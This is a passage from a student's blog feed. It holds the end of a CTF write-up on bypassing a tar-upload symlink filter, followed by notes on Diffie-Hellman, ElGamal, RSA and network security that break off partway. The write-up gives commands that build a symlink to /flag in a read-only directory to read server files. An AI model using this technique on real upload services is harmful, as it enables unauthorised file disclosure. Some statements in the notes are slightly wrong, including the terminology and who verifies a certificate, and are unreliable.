<p>The difficulty is that it detects the symlink files and delete all.</p>
<p>How do we bypass it?</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">post <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:tarfile</span>] &amp;&amp; (tempfile = params[<span class="symbol">:tarfile</span>][<span class="symbol">:tempfile</span>])</span><br><span class="line">    <span class="keyword">return</span> err <span class="string">&quot;File not sent&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">unless</span> tempfile.size &lt;= <span class="number">10240</span></span><br><span class="line">    <span class="keyword">return</span> err <span class="string">&quot;File too big&quot;</span></span><br><span class="line">  <span class="keyword">end</span> </span><br><span class="line">  </span><br><span class="line">  path = <span class="title class_">SecureRandom</span>.hex <span class="number">16</span></span><br><span class="line">  <span class="keyword">unless</span> <span class="title class_">Dir</span>.mkdir <span class="string">&quot;uploads/<span class="subst">#&#123;path&#125;</span>&quot;</span>, <span class="number">0755</span></span><br><span class="line">    <span class="keyword">return</span> err <span class="string">&quot;Error creating directory&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">unless</span> system <span class="string">&quot;tar -xvf <span class="subst">#&#123;tempfile.path&#125;</span> -C uploads/<span class="subst">#&#123;path&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> err <span class="string">&quot;Error extracting tar file&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  links = <span class="title class_">Dir</span>.glob(<span class="string">&quot;uploads/<span class="subst">#&#123;path&#125;</span>/**/*&quot;</span>, <span class="title class_">File</span><span class="symbol">:</span><span class="symbol">:FNM_DOTMATCH</span>).select <span class="keyword">do</span> |<span class="params">f</span>|</span><br><span class="line">    <span class="comment"># Don&#x27;t show . or ..</span></span><br><span class="line">    <span class="keyword">if</span> [<span class="string">&quot;.&quot;</span>, <span class="string">&quot;..&quot;</span>].<span class="keyword">include</span>? <span class="title class_">File</span>.basename f</span><br><span class="line">      <span class="literal">false</span></span><br><span class="line">    <span class="comment"># Don&#x27;t show symlinks. Additionally delete them, they may be unsafe</span></span><br><span class="line">    <span class="keyword">elsif</span> <span class="title class_">File</span>.symlink? f</span><br><span class="line">      <span class="title class_">File</span>.unlink f</span><br><span class="line">      <span class="literal">false</span></span><br><span class="line">    <span class="comment"># Don&#x27;t show directories (but show files under them)</span></span><br><span class="line">    <span class="keyword">elsif</span> <span class="title class_">File</span>.directory? f</span><br><span class="line">      <span class="literal">false</span></span><br><span class="line">    <span class="comment"># Show everything else</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="literal">true</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ok links</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p><strong>Solution:</strong> </p>
<p>Create a random text file(or any other files) for just getting the uploaded path(since the symlink will not be shown on the page)</p>
<p>Create a directory <code>flagDir </code> and in the directory, generate a symlink: <code>ln -s /flag flag</code> -&gt; generate a symlink for <code>/flag</code></p>
<p>Set up file permission(100 -&gt; read only) for the directory so that it cannot be deleted.</p>
<p>Zip all the files: <code>tar -zcvf flag.tar flagDir/  </code></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Write-up</tag>
      </tags>
  </entry>
  <entry>
    <title>Diffie-Hellman key exchange and EL Gamal PKE</title>
    <url>/2022/04/04/Diffie-Hellman-key-exchange-EL-Gamal-PKE/</url>
    <content><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p><strong>Diffie-hellman key exchange</strong> is a crypto that is widely used. You can see it everywhere:</p>
<ul>
<li>SSL/TLS: web</li>
<li>IPsec: IPpackets</li>
<li>Bluetooth</li>
<li>5G</li>
<li>IOT</li>
</ul>
<p>In this blog, we are looking into DHKE, to see how it works. Moreover, EL Gamal PKE is a crypto that is based on DHKE, we will learn this as well.</p>
<span id="more"></span>

<h1 id="How-DHKE-works"><a href="#How-DHKE-works" class="headerlink" title="How DHKE works"></a>How DHKE works</h1><p>Let’s say we have Alice and Bob will use their public keys to encrypt a message and private keys to decrypt a message.</p>
<blockquote>
<p><strong>Alice’s public key</strong>: A<br><strong>Alice’s private key</strong>: a<br><strong>Bob’s public key</strong>: B<br><strong>Bob’s private key</strong>: b</p>
<p><strong>public parameters</strong>: p and g, p is a prime number, g&lt;p</p>
</blockquote>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220404231440796.png" alt="image-20220404231440796"></p>
<p>According to the formulas above, we can see that Alice and Bob will communicate the public keys and the shared keys they generate will be the same. Since there are some mathematical relationships between a private key and a public key, Alice or Bob can use their private keys and others’ public keys to get the shared key.</p>
<p>Then this shared key could be used in any symmetric cipher(like AES).</p>
<p>There’s a discrete log problem that prevents the shared key from being deduced by an attacker.</p>
<h1 id="EL-Gamal-PKE"><a href="#EL-Gamal-PKE" class="headerlink" title="EL Gamal PKE"></a>EL Gamal PKE</h1><h2 id="Differences"><a href="#Differences" class="headerlink" title="Differences"></a>Differences</h2><p><strong>For PKE</strong>, both Alice and Bob will need to publish their public keys, while <strong>for EL-Gamal PKE</strong>, we only need one of them(receiver) to publish the public key.</p>
<p>For <strong>DHKE</strong>, it only explains how a shared key is generated, <strong>EL-Gamal PKE</strong> shows how a message could be encrypted and decrypted using <strong>DHKE</strong>.</p>
<p>A very strong and solid explanation here:</p>
<p><a href="https://www.quora.com/What-is-the-difference-between-Diffie-Hellman-and-ElGamal">https://www.quora.com/What-is-the-difference-between-Diffie-Hellman-and-ElGamal</a></p>
<h2 id="How-it-works"><a href="#How-it-works" class="headerlink" title="How it works"></a>How it works</h2><ul>
<li><p>Asymmetric crypto to generate a shared key</p>
</li>
<li><p>symmetric crypto to encrypt a message</p>
</li>
</ul>
<h2 id="Scenario"><a href="#Scenario" class="headerlink" title="Scenario"></a>Scenario</h2><p>Bob published his key to his website, and was happy with receiving messages from all.</p>
<p>Alice is sending a message to Bob.</p>
<h3 id="Generate-Public-Key-B-Bob"><a href="#Generate-Public-Key-B-Bob" class="headerlink" title="Generate Public Key B(Bob)"></a>Generate Public Key B(Bob)</h3><ul>
<li>pick a random Prime(<code>p</code>), and a <code>g </code> such that<code>g&lt;p</code></li>
<li>pick a random private key <code>b</code></li>
</ul>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220404231502424.png" alt="image-20220404231502424"></p>
<p>Bob’s public key set will be like <code>&lt;p,g,B&gt;</code></p>
<p>Now Bob’s waiting for someone who is sending a encrypted message to him.</p>
<h3 id="Encryption-Alice"><a href="#Encryption-Alice" class="headerlink" title="Encryption(Alice)"></a>Encryption(Alice)</h3><p>Alice picks a random private key <code>a</code>, then calculate <strong>the shared key</strong> <code>K</code> by using Bob’s public key <code>B</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220404231539461.png" alt="image-20220404231539461"></p>
<p>Generate public key <code>A</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220404231707126.png" alt="image-20220404231707126"></p>
<p>Then Alice uses the shared key <code>K</code> to encrypt a plaintext P to get a <strong>ciphertext</strong> <code>C</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220404231728520.png" alt="image-20220404231728520"></p>
<p>This actually used the <strong>symmetric crypto</strong></p>
<p>Then Alice sends &lt;A, C&gt;(public key, ciphertext) to Bob</p>
<h3 id="Decryption-Bob"><a href="#Decryption-Bob" class="headerlink" title="Decryption(Bob)"></a>Decryption(Bob)</h3><p>According to Alice’s public key <code>A</code>, Bob can calculate the shared key <code>K</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220404231745506.png" alt="image-20220404231745506"></p>
<p>Then Bob decrypts the message by using the shared key <code>K</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220404231801397.png" alt="image-20220404231801397"></p>
<h1 id="Calculation-Trick"><a href="#Calculation-Trick" class="headerlink" title="Calculation Trick"></a>Calculation Trick</h1><p><strong>Square &amp; Multiply Algorithm</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220404225848657.png" alt="image-20220404225848657"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220404231821863.png" alt="image-20220404231821863"></p>
<p>From the most left number(ignore it)</p>
<p><strong>binary 0</strong>: square</p>
<p><strong>binary 1</strong>: square then times <code>a</code></p>
<h1 id="RSA-crypto"><a href="#RSA-crypto" class="headerlink" title="RSA crypto"></a>RSA crypto</h1><h3 id="RSA-key-generation"><a href="#RSA-key-generation" class="headerlink" title="RSA key generation"></a>RSA key generation</h3><p>choose two primes: <code>p = 5 and q = 11</code></p>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="variable">n</span> <span class="operator">=</span> <span class="variable">p</span><span class="operator">*</span><span class="variable">q</span> <span class="operator">=</span> <span class="number">5</span> <span class="operator">*</span> <span class="number">11</span> <span class="operator">=</span> <span class="number">55</span></span><br><span class="line">ϕ<span class="punctuation">(</span><span class="variable">n</span><span class="punctuation">)</span><span class="operator">=</span><span class="punctuation">(</span><span class="variable">p</span><span class="operator">-</span><span class="number">1</span><span class="punctuation">)</span><span class="operator">*</span><span class="punctuation">(</span><span class="variable">q</span><span class="operator">-</span><span class="number">1</span><span class="punctuation">)</span><span class="operator">=</span><span class="number">4</span><span class="operator">*</span><span class="number">10</span><span class="operator">=</span><span class="number">40</span></span><br></pre></td></tr></table></figure>

<p>Find two numbers e and e according to<code> (e*d) mod ϕ(n) = 1</code>, thus, <code>e = 3, d = 27</code></p>
<p><strong>Public key:</strong> (e,n)=(3, 55)</p>
<p><strong>Private key:</strong> (d,n)=(27, 55)</p>
<h3 id="RSA-encryption"><a href="#RSA-encryption" class="headerlink" title="RSA encryption"></a>RSA encryption</h3><figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="variable">s</span> <span class="operator">=</span> <span class="variable">m</span><span class="operator">^</span><span class="punctuation">(</span><span class="variable">e</span><span class="punctuation">)</span><span class="variable">mod</span> <span class="variable">n</span></span><br></pre></td></tr></table></figure>

<h3 id="RSA-decryption"><a href="#RSA-decryption" class="headerlink" title="RSA decryption"></a>RSA decryption</h3><figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="variable">m</span> <span class="operator">=</span> <span class="variable">s</span><span class="operator">^</span><span class="punctuation">(</span><span class="variable">d</span><span class="punctuation">)</span><span class="variable">mod</span> <span class="variable">n</span></span><br></pre></td></tr></table></figure>



<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>Monash Uni FIT2093</p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Cryptography</category>
      </categories>
      <tags>
        <tag>Cryptography</tag>
      </tags>
  </entry>
  <entry>
    <title>FIT3031 Network Security Notes</title>
    <url>/2022/11/16/FIT3031-Network-Security-Notes/</url>
    <content><![CDATA[<h1 id="FIT3031-Network-Security-Notes"><a href="#FIT3031-Network-Security-Notes" class="headerlink" title="FIT3031 Network Security Notes"></a>FIT3031 Network Security Notes</h1><h2 id="Week-1-Overview"><a href="#Week-1-Overview" class="headerlink" title="Week 1: Overview"></a>Week 1: Overview</h2><h3 id="Type-of-Network-Attacks"><a href="#Type-of-Network-Attacks" class="headerlink" title="Type of Network Attacks"></a>Type of Network Attacks</h3><ul>
<li>Interruption<ul>
<li>Availability</li>
</ul>
</li>
<li>Interception<ul>
<li>Confidentiality</li>
</ul>
</li>
<li>Modification<ul>
<li>Integrity</li>
</ul>
</li>
<li>Fabrication<ul>
<li>Authentication</li>
</ul>
</li>
</ul>
<span id="more"></span>

<h3 id="Threats-Attacks-Vulnerabilities-amp-Risks"><a href="#Threats-Attacks-Vulnerabilities-amp-Risks" class="headerlink" title="Threats, Attacks, Vulnerabilities &amp; Risks"></a>Threats, Attacks, Vulnerabilities &amp; Risks</h3><p> Threats</p>
<ul>
<li>a malicious or negative event that takes advantage of vulnerabilities.</li>
</ul>
<p>Attacks</p>
<ul>
<li>passive attack: eavesdropping, traffic analysis</li>
<li>active attack: denial of service(DoS), injection</li>
</ul>
<p>Vulnerabilities</p>
<ul>
<li>Flaws, e.g. lack of AUTH</li>
</ul>
<p>Risks</p>
<ul>
<li>likelihood of attacks &amp; consequence of attacks</li>
<li>potential damage or loss when the threat occurs</li>
</ul>
<h3 id="Security-Mechanisms"><a href="#Security-Mechanisms" class="headerlink" title="Security Mechanisms"></a>Security Mechanisms</h3><ul>
<li>Prevention</li>
<li>Detection</li>
<li>Recovery</li>
</ul>
<h3 id="Security-Goals"><a href="#Security-Goals" class="headerlink" title="Security Goals"></a>Security Goals</h3><ul>
<li><p>Secrecy/ Confidentiality(CONF)</p>
<ul>
<li>Encryption</li>
</ul>
</li>
<li><p>Integrity</p>
<ul>
<li>Message Authentication Code(MAC)</li>
<li>Digital Signature</li>
</ul>
</li>
<li><p>Authentication</p>
<ul>
<li>The digital signature, biometrics, password</li>
</ul>
</li>
<li><p>Non-repudiation(NR)</p>
<ul>
<li>The digital signature, biometrics</li>
</ul>
</li>
<li><p>Availability</p>
</li>
</ul>
<h3 id="Crypto-Overview"><a href="#Crypto-Overview" class="headerlink" title="Crypto Overview"></a>Crypto Overview</h3><table>
<thead>
<tr>
<th></th>
<th>Symmetric</th>
<th>Asymmetric</th>
</tr>
</thead>
<tbody><tr>
<td>Confidentiality</td>
<td>One-time Pad cipher, Stream ciphers, Block Ciphers</td>
<td>Encryption with Public Key</td>
</tr>
<tr>
<td>Integrity</td>
<td>Message Authentication Code(e.g. HMAC)</td>
<td>Digital Signature</td>
</tr>
<tr>
<td>Authentication</td>
<td>MAC+Nonce</td>
<td>Digital Signature + Nonce</td>
</tr>
</tbody></table>
<p><img src="https://img-blog.csdnimg.cn/2019090612012265.png" alt="Comparison of hash,MAC and digital signature"></p>
<p>Stream cipher</p>
<ul>
<li>an encryption algorithm that <strong>uses a symmetric key</strong> to encrypt and decrypt a given amount of data.</li>
</ul>
<p>One-time pad cipher:</p>
<ul>
<li>a randomly generated private key is used <strong>only once</strong> to encrypt a message and decrypted by the recipient using a matching one-time pad and key.</li>
</ul>
<p>Message Authentication Code(MAC)</p>
<ul>
<li>The sender forwards the message along with the MAC which uses a secret key to compress the message.</li>
<li>The message is sent in clear with MAC.</li>
<li>The secret key is only known to the sender and the intended recipient.</li>
<li><strong>cannot</strong> achieve <strong>Non-repudiation</strong> -&gt; we cannot identify who sent this MAC - sender or recipient?</li>
</ul>
<h3 id="Symmetric-vs-Asymmetric"><a href="#Symmetric-vs-Asymmetric" class="headerlink" title="Symmetric vs Asymmetric"></a>Symmetric vs Asymmetric</h3><p>Symmetric encryption</p>
<ul>
<li>fast</li>
<li>has a key distribution problem</li>
<li>Block cipher: ARS</li>
<li>Stream cipher modes: RC4</li>
</ul>
<p>Public-key encryption</p>
<ul>
<li>slow</li>
<li>has no key distribution problem</li>
<li>RSA, ElGamal</li>
</ul>
<h3 id="Adversarial-Capability-Against-Encryption"><a href="#Adversarial-Capability-Against-Encryption" class="headerlink" title="Adversarial Capability Against Encryption"></a>Adversarial Capability Against Encryption</h3><ul>
<li><p>Ciphertext-only adversary</p>
<ul>
<li>the attacker knows ciphertext by eavesdropping</li>
</ul>
</li>
<li><p>Known-plaintext adversary</p>
<ul>
<li>the attacker knows at least one sample of both plaintext and ciphertext.</li>
<li>e.g. <strong>XOR cipher</strong> can be compromised to use <code>plaintext XOR ciphertext</code> to get the key </li>
</ul>
</li>
<li><p>Chosen-plaintext attack</p>
<ul>
<li>the attacker can choose what plaintext will be <strong>encrypted</strong>.( Attacker can run the encryption functions for selected inputs)</li>
</ul>
</li>
<li><p>Chosen-ciphertext Adversary</p>
<ul>
<li>the attacker can choose ciphertext to be <strong>decrypted</strong>.</li>
</ul>
</li>
</ul>
<h2 id="Week-2-Public-Key-Infrastructure"><a href="#Week-2-Public-Key-Infrastructure" class="headerlink" title="Week 2: Public Key Infrastructure"></a>Week 2: Public Key Infrastructure</h2><h3 id="Man-in-the-Middle-MITM-Attack"><a href="#Man-in-the-Middle-MITM-Attack" class="headerlink" title="Man-in-the-Middle (MITM) Attack"></a>Man-in-the-Middle (MITM) Attack</h3><p>Scenario:</p>
<ol>
<li>Mallory intercepts <code>pk_alice</code> and forwards <code>pk_mallory</code> to Bob</li>
<li>Bob uses <code>pk_mallory</code> to encrypt messages as he cannot tell the difference</li>
<li>Mallory intercepts Bob’s encrypted messages and decrypts them.</li>
</ol>
<p><strong>Solution</strong></p>
<blockquote>
<ul>
<li>Alice needs to go to a trusted party(<strong>Certificate Authority</strong>) to get a certificate.</li>
<li>After verifying Alice’s identity, the trusted party issues a certificate with Alice’s name and her public key.</li>
<li>Alice sends the entire certificate to Bob.</li>
<li>Bob verifies the certificate using Alice’s public key - make sure it’s from Alice, not others.</li>
<li>The certificate cannot be forged or tampered</li>
</ul>
</blockquote>
<h3 id="Digital-Signature"><a href="#Digital-Signature" class="headerlink" title="Digital Signature"></a>Digital Signature</h3><p>Use the private key to encrypt the message -&gt; generate the digital signature</p>
<p>Use the public key to decrypt the digital signature -&gt; verify the digital signature -&gt; check if <code>M == M&#39;</code></p>
<h3 id="Digital-Certificate"><a href="#Digital-Certificate" class="headerlink" title="Digital Certificate"></a>Digital Certificate</h3><h4 id="X-509-Certificate-Example"><a href="#X-509-Certificate-Example" class="headerlink" title="X.509 Certificate Example"></a>X.509 Certificate Example</h4><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221104124318376.png"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221104124353614.png"></p>
<p>Other fields:</p>
<ul>
<li>Usage period</li>
<li>Serial number</li>
</ul>
<h4 id="Domain-Validated-Certificate-DV"><a href="#Domain-Validated-Certificate-DV" class="headerlink" title="Domain Validated Certificate(DV)"></a>Domain Validated Certificate(DV)</h4><p>The CA verifies the domain records to check if the domain belongs to the applicant(before issuing the certificate).</p>
<p>Domain Control Validation is performed on the domain name in the certificate request.</p>
<h4 id="Organizational-Validated-Certificate-OV"><a href="#Organizational-Validated-Certificate-OV" class="headerlink" title="Organizational Validated Certificate(OV)"></a>Organizational Validated Certificate(OV)</h4><p>CAs verify the following before issuing OV certificates: </p>
<ul>
<li>Domain control validation. </li>
<li>Applicant’s identity and address. </li>
<li>Applicant’s link to the organisation. </li>
<li>Organisation’s address. </li>
<li>Organisation’s WHOIS record.</li>
<li>Callback on the organisation’s verified telephone number </li>
</ul>
<h4 id="Extended-Validated-Certificate-EV"><a href="#Extended-Validated-Certificate-EV" class="headerlink" title="Extended Validated Certificate(EV)"></a>Extended Validated Certificate(EV)</h4><p>CAs issuing EV certificates require documents that are legally signed from <strong>registration authorities</strong>- needs to verify the organization. (will verify the legal and proper standings of the organisation)</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221104104444256.png"></p>
<h4 id="Digital-signature-in-Digital-Certificate"><a href="#Digital-signature-in-Digital-Certificate" class="headerlink" title="Digital signature in Digital Certificate"></a>Digital signature in Digital Certificate</h4><p><strong>CA generates a digital signature in the certificate using its private key</strong>. Anyone can verify the digital signature to see if the certificate has been modified using CA’s public key.</p>
<h3 id="Certificate-Authorities"><a href="#Certificate-Authorities" class="headerlink" title="Certificate Authorities"></a>Certificate Authorities</h3><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221104105253255.png"></p>
<p><strong>Root CA’s certificates are self-signed.</strong></p>
<blockquote>
<p><strong>How Root CA can be trusted?</strong></p>
<p>Public keys of CAs will be preinstalled in the OS, browser and other software.</p>
</blockquote>
<p>Using Root CA’s public key to verify Intermediate CA’s certificate, Using Intermediate CA’s public key to verify Sub CA’s certificate.</p>
<h4 id="Attack-Scenario-Authentic-Certificate"><a href="#Attack-Scenario-Authentic-Certificate" class="headerlink" title="Attack Scenario: Authentic Certificate"></a>Attack Scenario: Authentic Certificate</h4><p>The attacker forwards the authentic certificate to Alice.</p>
<p>Alice finds the certificate is authentic so she uses the certificate’s public key to encrypt the <code>secret</code> and send it to the “server”.</p>
<p>The attacker will intercept the request but he cannot decrypt the <code>secret</code> because he doesn’t know the private key</p>
<h4 id="Attack-Scenario-Fake-Certificate"><a href="#Attack-Scenario-Fake-Certificate" class="headerlink" title="Attack Scenario: Fake Certificate"></a>Attack Scenario: Fake Certificate</h4><p>The attacker creates a fake certificate for the domain <code>example.com</code> with his own public key.</p>
<p>CA will not sign the certificate as the attacker is not the owner of <code>example.com</code>.</p>
<p>The attacker tries to self-sign the certificate and sends it to Alice.</p>
<p>Alice’s browser will give the warning as it cannot find any trusted certificate to verify the received certificate.</p>
<h4 id="Attack-Scenario-Attacker’s-Certificate"><a href="#Attack-Scenario-Attacker’s-Certificate" class="headerlink" title="Attack Scenario: Attacker’s Certificate"></a>Attack Scenario: Attacker’s Certificate</h4><p>The attacker has his own valid certificate.</p>
<p>The attacker sends his certificate to Alice.</p>
<p>Alice’s browser checks if the certificate’s <strong>subject field</strong> matches Alice’s intent.</p>
<h3 id="Attacks-on-PKI"><a href="#Attacks-on-PKI" class="headerlink" title="Attacks on PKI"></a>Attacks on PKI</h3><p><strong>The Man-in-the-Middle proxy</strong></p>
<blockquote>
<p>The proxy creates a self-signed CA certificate installed on the user’s browser.</p>
<p>The proxy will intercept the communication.</p>
</blockquote>
<p><strong>Attacks on CA’s verification process</strong></p>
<p><strong>Attacks on CA’s signing process</strong>: the private key is compromised</p>
<ul>
<li>How to protect the private key? Use <strong>Hardware Security Model</strong></li>
</ul>
<p><strong>Attacks on Algorithms</strong>: Digital certificate depends on one-way hash and digital signature.</p>
<ul>
<li>Use stronger algorithms</li>
</ul>
<p><strong>Attacks on User confirmation</strong>:  Some software does not compare these two pieces of information(the common name field inside the certificate and information provided or approved by user): <strong>security flaw</strong> </p>
<h2 id="Week-3-Email-Security"><a href="#Week-3-Email-Security" class="headerlink" title="Week 3: Email Security"></a>Week 3: Email Security</h2><h3 id="Overview-Questions"><a href="#Overview-Questions" class="headerlink" title="Overview Questions"></a>Overview Questions</h3><ul>
<li>What are the principal services provided by PGP?<ul>
<li>Key management, Confidentiality, Integrity, Authenticity.</li>
</ul>
</li>
<li>What is the utility of a detached signature?<ul>
<li>Signatures are sent separately. Two files, original data and the signature.</li>
</ul>
</li>
<li>Why use R64 conversion for an e-mail application?<ul>
<li>Some email servers don’t accept emails in binary, it needs to be in printable characters. R64 uses ASCII character which are all printable.</li>
</ul>
</li>
<li>What is S/MEME? what are the cryptographic functions used in S/MIME?<ul>
<li>S/MIME = Encrypted MIME</li>
<li>3DES/AES for encryption, Elgamal for key exchange, SHA for signatures</li>
</ul>
</li>
<li>What is DKIM? How is the DKIM email authentication service different when compared to S/MIME or PGP?<ul>
<li>The sender’s email server signs emails</li>
<li>DKIM is for email server to email server, PGP and S/MIME are end to end encryption.</li>
</ul>
</li>
</ul>
<h3 id="Simple-Mail-Transfer-Protocol-SMTP"><a href="#Simple-Mail-Transfer-Protocol-SMTP" class="headerlink" title="Simple Mail Transfer Protocol (SMTP)"></a>Simple Mail Transfer Protocol (SMTP)</h3><ul>
<li>text only</li>
<li>limited to ASCII</li>
<li>Size limit</li>
<li>command only</li>
<li>issues<ul>
<li>no security - clear/plain messages</li>
</ul>
</li>
</ul>
<h3 id="Email-Threats"><a href="#Email-Threats" class="headerlink" title="Email Threats"></a>Email Threats</h3><ul>
<li>Authenticity<ul>
<li>unauthorised access</li>
</ul>
</li>
<li>Integrity<ul>
<li>unauthorised modification of emails</li>
</ul>
</li>
<li>Confidentiality<ul>
<li>unauthorised disclosure of sensitive information</li>
</ul>
</li>
<li>Availability<ul>
<li>prevent users from sending/receiving emails</li>
</ul>
</li>
</ul>
<p>TLS is not enough secure for emails, because it only secures communication between two hops. ALL intermediate hops see plaintext.</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221104131545588.png"></p>
<h3 id="Pretty-Good-Privacy-PGP"><a href="#Pretty-Good-Privacy-PGP" class="headerlink" title="Pretty Good Privacy (PGP)"></a>Pretty Good Privacy (PGP)</h3><ul>
<li><p>key management</p>
</li>
<li><p>AUTH + INT</p>
<ul>
<li>Digital signature(Non-repudiation)</li>
</ul>
</li>
<li><p>CONF</p>
<ul>
<li>Encryption</li>
</ul>
</li>
<li><p><strong>Encryption steps</strong></p>
<ul>
<li>HASH(M) =&gt; <strong>digest</strong></li>
<li>RSA(digest,secretKey) =&gt; <strong>digital signature</strong><ul>
<li>RSA is a public-key encryption especially used for signing.</li>
</ul>
</li>
<li>Digital signature || M =&gt; certificate</li>
<li>Compress(certificate) =&gt; compressed certificate</li>
<li>AES(sessionKey, compressed certificate) =&gt; encrypted compressed certificate(using symmetric encryption)</li>
<li>RSA(sessionKey, ReceiverPublicKey) =&gt; encrypted sessionKey, used to transmit session key, another user can use his private key to get the session key.</li>
<li>Send to the recipient:  encrypted compressed certificate || encrypted sessionKey</li>
</ul>
</li>
<li><p><strong>Decryption steps</strong></p>
<ul>
<li>Get decrypted session key using the private key =&gt; sessionKey</li>
<li>Get decrypted compressed certificate using the seesionKey =&gt; compressed cetrificate</li>
<li>Get M||digital signature by decompressing the data =&gt; <code>M||digital signature = DeCompress(compressed certificate)</code></li>
<li>Verify hash(M) and hash(M’)<ul>
<li>Hash(M’) = decrypt the digital signature using the sender’s public key.</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>Compression</strong></p>
<ul>
<li><p>PGP uses a ZIP compression algorithm, <strong>after</strong> applying the signature and <strong>before</strong> the encryption</p>
</li>
<li><p>Why does this order matter?</p>
<ul>
<li>It is preferable to sign an uncompressed message so that the signature does not depend on the compression algorithm. If you do the compression first, the signatures will be different when different compression algorithms are applied.</li>
<li>This has the benefit of saving space both for e-mail transmission and for file storage.</li>
<li><strong>Encryption after compression</strong> strengthens the encryption, since compression reduces redundancy in the message.</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>Radix-64 conversion</strong></p>
<ul>
<li>used for achieving compatibility with email protocols</li>
<li>text=&gt;Binary =&gt; ASCII character, every 6bits = 1 ASCII character</li>
<li><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221104151025128.png"></li>
</ul>
</li>
<li><p><strong>Key Management</strong></p>
<ul>
<li>send key identifier(KeyID) instead of full pk for bandwidth efficiency</li>
<li>users can have multiple key pairs</li>
<li>two types of key rings to maintain<ul>
<li>her own public/private key pairs<ul>
<li><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221104151909960.png"></li>
<li>Store encrypted private keys instead of clear private keys</li>
</ul>
</li>
<li>public keys of other correspondents<ul>
<li>all pk of other users known to the user, indexed by their key Ids.</li>
<li><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221104151758274.png"></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>Trust Model</p>
<ul>
<li>not rely on certificate authorities (CAs)</li>
<li>every user is its own CA<ul>
<li>Sign keys for users they know</li>
</ul>
</li>
<li>forms web of trust<ul>
<li>trusted keys signed</li>
<li>trusted keys other have signed if there is a chain of signatures to them</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>Limitations</strong></p>
<ul>
<li>Must exchange public key</li>
<li>Target attacks against PGP keyIDs</li>
<li>prevent useful functionality like search, spam filtering, topic extraction..</li>
</ul>
</li>
</ul>
<h3 id="MIME"><a href="#MIME" class="headerlink" title="MIME"></a>MIME</h3><p>MIME(Secure/MultipurposeInternet Mail Extensions) supports different types of content.</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221104153525217.png"></p>
<p>Each client has a list of trusted CA’s certs and their own pairs &amp; certs signed by trusted CA’s</p>
<h3 id="Domain-Keys-Identified-Mail-DKIM"><a href="#Domain-Keys-Identified-Mail-DKIM" class="headerlink" title="Domain Keys Identified Mail(DKIM)"></a>Domain Keys Identified Mail(DKIM)</h3><p>Tx(user)’s email must be signed by a secret key of the admin domain of Tx before leaving the domain.</p>
<p>Transparent to user.</p>
<p>Rx can verify the signature using the domain’s public key.</p>
<p>the public key will be stored in the DNS server, the signature will be attached to the header of the email.</p>
<h2 id="Week-4-IPSec"><a href="#Week-4-IPSec" class="headerlink" title="Week 4: IPSec"></a>Week 4: IPSec</h2><h3 id="Concepts"><a href="#Concepts" class="headerlink" title="Concepts"></a>Concepts</h3><p>IPSec =&gt; network layer</p>
<p>IPSec <strong>secures IP datagrams at the Internet layer according to the security policy</strong> of a communicating IP node, before forwarding them to the network interface layer.</p>
<p>The intended receiving IP node verifies the datagrams according to the <strong>established security paramaeters</strong> and <strong>rejects</strong> any that have not been protected in accordance with the policy defined for such traffic.</p>
<h3 id="IPSec-Services"><a href="#IPSec-Services" class="headerlink" title="IPSec Services"></a>IPSec Services</h3><blockquote>
<p><strong>Authentication</strong></p>
<ul>
<li>data origin authentication - verifies the claimed identify of the source data</li>
</ul>
<p><strong>Integrity</strong></p>
<ul>
<li>connectionless integrity<ul>
<li>detects tampering of individual ip datagrams</li>
</ul>
</li>
<li>Anti-replay integrity<ul>
<li>detects arrival of duplicate IP datagrams</li>
</ul>
</li>
</ul>
<p><strong>Confidentiality:</strong></p>
<ul>
